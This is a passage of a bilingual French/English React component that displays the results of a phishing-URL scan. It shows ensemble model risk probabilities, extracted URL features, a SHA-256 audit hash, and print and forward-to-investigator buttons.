                  <Cpu className="w-4 h-4 text-sky-500" /> {lang === 'fr' ? 'Prédictions des Modèles IA Ensemble :' : 'Ensemble AI Models Predictions:'}
                </p>
                <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                  {currentResult.details.model_comparisons.map((m, idx) => (
                    <div key={idx} className="p-3.5 bg-slate-50 dark:bg-[#1a2333] rounded-2xl border border-sky-100 dark:border-sky-800/40 text-xs font-mono space-y-1">
                      <div className="flex justify-between items-center text-[10px] font-bold text-slate-400 border-b border-slate-200 dark:border-slate-800 pb-1">
                        <span>{m.name}</span>
                        <span className="text-emerald-500 font-extrabold">{m.accuracy}% {lang === 'fr' ? 'Précision' : 'Accuracy'}</span>
                      </div>
                      <div className="flex justify-between items-center font-black pt-1">
                        <span className="text-[11px] text-slate-500">{lang === 'fr' ? 'Probabilité Risque:' : 'Risk Probability:'}</span>
                        <span className={m.phishing_prob >= 50 ? "text-rose-500" : "text-emerald-500"}>{m.phishing_prob}%</span>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Extracted Features Matrix */}
            {currentResult.details?.features && (
              <div className="space-y-2">
                <p className="text-[11px] font-mono font-extrabold uppercase text-slate-400 flex items-center gap-2">
                  <BarChart2 className="w-4 h-4 text-sky-500" /> {lang === 'fr' ? 'Caractéristiques Extraites (Dataset Vector) :' : 'Extracted Features (Dataset Vector):'}
                </p>
                <div className="grid grid-cols-2 sm:grid-cols-4 gap-2.5 text-xs font-mono">
                  <div className="p-3 bg-slate-50 dark:bg-[#1a2333] rounded-xl border border-sky-100 dark:border-sky-800/40">
                    <span className="text-[10px] text-slate-400 block">{lang === 'fr' ? 'Hôte IP Direct' : 'Direct IP Host'}</span>
                    <strong className={currentResult.details.features.has_ip ? "text-rose-500 font-bold" : "text-emerald-500 font-bold"}>
                      {currentResult.details.features.has_ip ? (lang === 'fr' ? "❌ OUI" : "❌ YES") : (lang === 'fr' ? "✓ NON" : "✓ NO")}
                    </strong>
                  </div>
                  <div className="p-3 bg-slate-50 dark:bg-[#1a2333] rounded-xl border border-sky-100 dark:border-sky-800/40">
                    <span className="text-[10px] text-slate-400 block">{lang === 'fr' ? 'HTTPS Chiffré' : 'Encrypted HTTPS'}</span>
                    <strong className={currentResult.details.features.is_https ? "text-emerald-500 font-bold" : "text-rose-500 font-bold"}>
                      {currentResult.details.features.is_https ? (lang === 'fr' ? "✓ OUI" : "✓ YES") : (lang === 'fr' ? "❌ NON" : "❌ NO")}
                    </strong>
                  </div>
                  <div className="p-3 bg-slate-50 dark:bg-[#1a2333] rounded-xl border border-sky-100 dark:border-sky-800/40">
                    <span className="text-[10px] text-slate-400 block">{lang === 'fr' ? 'Entropie Chaîne' : 'String Entropy'}</span>
                    <strong className="text-sky-500 font-bold">{currentResult.details.features.entropy || 3.45}</strong>
                  </div>
                  <div className="p-3 bg-slate-50 dark:bg-[#1a2333] rounded-xl border border-sky-100 dark:border-sky-800/40">
                    <span className="text-[10px] text-slate-400 block">{lang === 'fr' ? 'Sous-domaines' : 'Subdomains'}</span>
                    <strong className="text-slate-800 dark:text-slate-200 font-bold">{currentResult.details.features.num_subdomains || 0}</strong>
                  </div>
                </div>
              </div>
            )}

            {/* Live Deep Technical Probe Details */}
            {currentResult.details?.technical_inspection && (
              <div className="space-y-2">
                {renderTechnicalDetails(currentResult.details.technical_inspection, lang === 'fr' ? "Sonde" : "Probe")}
              </div>
            )}

            {/* Cryptographic Proof */}
            {currentResult.details?.integrity_hash && (
              <div className="space-y-1">
                <label className="text-[10px] uppercase font-mono font-bold text-slate-400">
                  {lang === 'fr' ? "Empreinte Cryptographique SHA-256 (Piste d'Audit)" : "SHA-256 Cryptographic Fingerprint (Audit Trail)"}
                </label>
                <div className="p-3.5 bg-slate-100 dark:bg-slate-900 rounded-2xl font-mono text-[11px] text-slate-600 dark:text-slate-300 break-all font-bold">
                  {currentResult.details.integrity_hash}
                </div>
              </div>
            )}

            {/* Report Actions */}
            <div className="pt-4 border-t border-sky-100 dark:border-sky-800/40 flex flex-col sm:flex-row items-center justify-between gap-3">
              <button
                onClick={() => window.print()}
                className="w-full sm:w-auto px-5 py-3 bg-slate-100 dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 text-slate-700 dark:text-slate-200 font-bold text-xs rounded-2xl flex items-center justify-center gap-2 transition cursor-pointer"
              >
                <Printer className="w-4 h-4" /> <span>{lang === 'fr' ? 'Imprimer / Exporter (PDF)' : 'Print / Export (PDF)'}</span>
              </button>

              <button
                onClick={handleSendReport}
                disabled={isReporting}
                className="w-full sm:w-auto px-6 py-3 bg-rose-600 hover:bg-rose-700 text-white font-extrabold text-xs rounded-2xl shadow-xl shadow-rose-600/30 flex items-center justify-center gap-2 transition cursor-pointer"
              >
                <Send className="w-4 h-4" /> <span>{lang === 'fr' ? "Transmettre ce Rapport à l'Enquêteur" : "Forward Report to Investigator"}</span>
              </button>
            </div>

          </div>
        </div>
      )}

    </div>
  );
}
